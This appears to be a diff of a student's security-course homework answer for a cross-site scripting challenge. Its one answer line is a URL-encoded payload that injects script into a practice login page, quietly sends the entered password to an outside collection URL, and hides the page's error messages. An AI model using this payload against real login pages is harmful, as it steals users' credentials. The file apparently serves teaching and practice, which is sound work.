@@ -1,5 +1,5 @@
 Lee Segal (segall2)
-Worked on this assighnment with Dimi Dimov 
+Worked on this assighnment with Dimi Dimov and Sydnie Lee 
 
 1) http://xss-challenges.r7.io/0/login?username=%27%3E%3C%2Fspan%3E%3Cscript%3E%24%28document%29.ready%28function%28%29+%7B%24%28%27%23signin-btn%27%29.click%28function%28%29%7Bvar+i+%3D+new+Image%28%29%3B+i.src%3D%27http%3A%2F%2Fr7.io%2Fe%2Fsegall2%3Fs%3D%27%2B%24%28%27%23login_password%27%29.val%28%29%3B%7D%29%3B%7D%29%3B+%24%28%27p.error-message%27%29.css%28%7B%22visibility%22%3A%22hidden%22%7D%29%3B%24%28%27h2.problem%27%29.css%28%7B%22visibility%22%3A%22hidden%22%7D%29%3B%3C%2Fscript%3E%3Cspan%3E+&password=kk&user_language=english
 
